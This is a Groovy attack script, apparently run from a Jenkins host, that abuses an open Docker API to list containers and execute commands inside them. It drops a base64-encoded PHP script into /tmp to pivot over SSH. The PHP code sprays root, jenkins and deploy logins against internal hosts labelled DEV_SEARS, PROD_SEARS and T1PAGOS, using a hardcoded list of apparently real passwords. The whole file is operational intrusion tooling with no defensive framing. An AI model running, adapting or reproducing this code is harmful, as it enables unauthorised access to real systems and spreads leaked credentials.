// Phase 3: Enum all containers + SSH pivot attempts
dockerApi = "http://172.27.140.148:4243"

def httpGet(String urlStr) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setConnectTimeout(8000)
    conn.setReadTimeout(15000)
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(120000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String containerId, String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

// List ALL containers (running + stopped)
println "===== ALL CONTAINERS ====="
def containers = httpGet(dockerApi + "/containers/json?all=true")
def js = new groovy.json.JsonSlurper()
def cs = js.parseText(containers.body)
cs.each { c ->
    println "ID: ${c.Id?.take(12)} | Names: ${c.Names} | Image: ${c.Image} | Status: ${c.Status} | State: ${c.State}"
    if (c.NetworkSettings?.Networks) {
        c.NetworkSettings.Networks.each { name, net ->
            println "  NET: ${name} | IP: ${net.IPAddress} | GW: ${net.Gateway}"
        }
    }
}

println ""
println "===== SSH FROM PHP CONTAINER (5b32e909c295) ====="
// Check what SSH tools are available
println "--- Available tools ---"
println execIn("5b32e909c295", "which ssh sshpass nc ncat curl wget python python3 perl 2>/dev/null; ls /usr/bin/ssh* 2>/dev/null; dpkg -l | grep ssh 2>/dev/null || rpm -qa | grep ssh 2>/dev/null")

println ""
println "--- My IP (as seen by targets) ---"
println execIn("5b32e909c295", "hostname -I 2>/dev/null; ip addr show eth0 2>/dev/null | grep inet; cat /etc/hostname")

println ""
println "===== SSH BRUTE via PHP to DEV SEARS 172.27.141.6 ====="
// Try SSH password auth via PHP stream socket (no ssh binary needed)
def php_ssh = '''<?php
$targets = array(
    array("172.27.141.6", 22, "DEV_SEARS"),
    array("172.27.141.4", 22, "T1PAGOS"),
    array("172.27.141.24", 22, "PROD_SEARS"),
);

// Read SSH banners first
foreach ($targets as $t) {
    list($host, $port, $label) = $t;
    $fp = @fsockopen($host, $port, $en, $es, 3);
    if ($fp) {
        stream_set_timeout($fp, 3);
        $banner = fgets($fp, 512);
        echo "BANNER|$label|$host:$port|".trim($banner)."\\n";
        fclose($fp);
    } else {
        echo "CLOSED|$label|$host:$port\\n";
    }
}

// Check if ssh2 extension is available
if (function_exists("ssh2_connect")) {
    echo "\\nSSH2_EXT=AVAILABLE\\n";
    $ssh_creds = array(
        array("root", ""),
        array("root", "nNzy]Ku2Ah=u%y1I"),
        array("root", "wUt22Us2CUh#+M="),
        array("root", "JenkisLegasy25"),
        array("root", "e6LBqIkOI\\$PR1XX2oia"),
        array("root", "dtvV50vwfGq5CO9"),
        array("root", "plug*spoke!MosqueCloud3col"),
        array("jenkins", "e6LBqIkOI\\$PR1XX2oia"),
        array("jenkins", "JenkisLegasy25"),
        array("deploy", "e6LBqIkOI\\$PR1XX2oia"),
        array("deploy", "JenkisLegasy25"),
        array("sears", "nNzy]Ku2Ah=u%y1I"),
        array("ubuntu", "nNzy]Ku2Ah=u%y1I"),
    );
    foreach ($targets as $t) {
        list($host, $port, $label) = $t;
        echo "\\n--- SSH AUTH: $label ($host) ---\\n";
        foreach ($ssh_creds as $c) {
            list($user, $pass) = $c;
            $conn = @ssh2_connect($host, $port, array(), array(), array("timeout" => 5));
            if (!$conn) { echo "  CONN_FAIL|$user\\n"; continue; }
            if (@ssh2_auth_password($conn, $user, $pass)) {
                echo "  *** SSH_AUTH_OK *** | $user | $pass\\n";
                $stream = ssh2_exec($conn, "id; hostname; cat /etc/hostname");
                stream_set_blocking($stream, true);
                echo "  OUTPUT: ".stream_get_contents($stream)."\\n";
                break;
            } else {
                echo "  SSH_FAIL|$user\\n";
            }
        }
    }
} else {
    echo "\\nSSH2_EXT=NOT_AVAILABLE\\n";
    echo "Trying alternative: exec sshpass/ssh\\n";
    
    // Check if sshpass exists
    $out = shell_exec("which sshpass 2>/dev/null");
    if (trim($out)) {
        echo "SSHPASS=".trim($out)."\\n";
    } else {
        echo "SSHPASS=NOT_FOUND\\n";
    }
    
    // Check if ssh exists  
    $out = shell_exec("which ssh 2>/dev/null");
    if (trim($out)) {
        echo "SSH=".trim($out)."\\n";
        // Try SSH with StrictHostKeyChecking=no
        $creds = array(
            array("root", "nNzy]Ku2Ah=u%y1I"),
            array("root", "wUt22Us2CUh#+M="),
            array("root", "JenkisLegasy25"),
            array("root", "e6LBqIkOI\\$PR1XX2oia"),
            array("jenkins", "e6LBqIkOI\\$PR1XX2oia"),
            array("deploy", "e6LBqIkOI\\$PR1XX2oia"),
        );
        echo "NOTE: Cannot spray SSH without sshpass or ssh2 ext. Trying expect...\\n";
        $out = shell_exec("which expect 2>/dev/null");
        echo "EXPECT=".trim($out)."\\n";
    } else {
        echo "SSH=NOT_FOUND\\n";
    }
}

echo "\\nSSH_SCAN_DONE\\n";
'''
def b64 = php_ssh.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_ssh.php && php /tmp/_ssh.php 2>&1; rm -f /tmp/_ssh.php"
println execIn("5b32e909c295", cmd)
